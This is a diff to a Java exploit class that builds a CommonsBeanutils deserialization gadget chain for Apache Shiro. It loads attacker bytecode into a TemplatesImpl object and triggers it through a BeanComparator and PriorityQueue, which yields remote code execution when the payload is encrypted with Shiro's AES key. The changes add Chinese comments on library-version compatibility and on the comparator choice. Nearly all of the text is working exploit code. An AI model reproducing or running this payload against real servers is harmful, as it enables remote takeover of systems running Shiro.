@@ -11,7 +11,7 @@ import org.apache.shiro.crypto.AesCipherService;
 import org.apache.shiro.util.ByteSource;
 /**
  * 只需要shrio自带的commons-beanutils（1.8.3）依赖即可
- * 
+ * 版本高了会出现serialVersionUID不一样的问题
  */
 public class cb {
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
@@ -25,9 +25,9 @@ public class cb {
         setFieldValue(obj, "_bytecodes", new byte[][]{code});
         setFieldValue(obj, "_name", "zeropeach");
         setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
-        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
+        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);    //拿到上下文中的CaseInsensitiveComparator对象
         Queue queue = new PriorityQueue(2, comparator);
-        queue.add("1");
+        queue.add("1");                                    //改为字符串类型
         queue.add("1");
         setFieldValue(comparator, "property", "outputProperties");
         setFieldValue(queue, "queue", new Object[]{obj, obj});
